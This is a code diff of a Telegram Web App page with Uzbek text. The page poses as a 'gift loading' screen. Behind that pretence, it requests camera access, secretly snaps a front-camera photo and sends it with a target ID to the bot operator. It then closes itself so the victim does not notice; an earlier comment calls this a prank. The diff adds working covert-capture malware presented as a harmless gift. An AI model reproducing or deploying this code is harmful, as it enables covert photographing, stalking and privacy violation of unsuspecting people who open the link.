@@ -1,42 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="uz">
 <head>
-    <title>Surpriz 🎁</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sovg'a Yuklanmoqda...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: sans-serif;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status { margin-top: 20px; text-align: center; }
+    </style>
 </head>
 <body>
-    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
+
+    <div class="loader"></div>
+    <div id="status">Sovg'a tayyorlanmoqda... <br> Iltimos, kameraga ruxsat bering.</div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
 
-        // Ssilka ichidan user_id ni olish
+        // 1. Ssilka ichidan user_id ni olamiz (agar kerak bo'lsa)
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user_id');
+        const userId = urlParams.get('user_id') || "unknown";
 
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // 2. Kameraga ruxsat so'raymiz
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
+                status.innerText = "Sovg'a ochilmoqda...";
+
+                // Kamera ishlashi uchun 2 soniya kutamiz
                 setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const data = canvas.toDataURL('image/jpeg');
-                    
-                    // Rasmni va ID-ni botga yuborish
-                    Telegram.WebApp.sendData(JSON.stringify({
-                        photo: data,
-                        target_id: userId
-                    }));
-                    
-                    // Prank sezilmasligi uchun oynani yopish
-                    setTimeout(() => Telegram.WebApp.close(), 500);
-                }, 1500);
+                    // Rasmni chizamiz
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7); // Sifatni biroz pasaytirdik (tezroq ketishi uchun)
+
+                    // 3. Telegramga ma'lumotni yuboramiz
+                    try {
+                        const payload = JSON.stringify({
+                            photo: imageData,
+                            target_id: userId
+                        });
+
+                        Telegram.WebApp.sendData(payload);
+                        
+                        // Ma'lumot yuborilishi uchun biroz kutib keyin yopamiz
+                        setTimeout(() => {
+                            Telegram.WebApp.close();
+                        }, 800);
+
+                    } catch (e) {
+                        status.innerText = "Xatolik yuz berdi. Bot bilan bog'laning.";
+                        console.error(e);
+                    }
+                }, 2500);
             })
             .catch(err => {
-                console.error("Xatolik:", err);
-                Telegram.WebApp.close();
+                status.innerText = "Xatolik: Kameraga ruxsat berilmadi yoki qurilma qo'llab-quvvatlamaydi.";
+                console.error(err);
+                // Agar rad etsa, 3 soniyadan keyin yopamiz
+                setTimeout(() => Telegram.WebApp.close(), 3000);
             });
+
+        // Web App ni kengaytirish (to'liq ekran)
+        Telegram.WebApp.expand();
     </script>
 </body>
 </html>
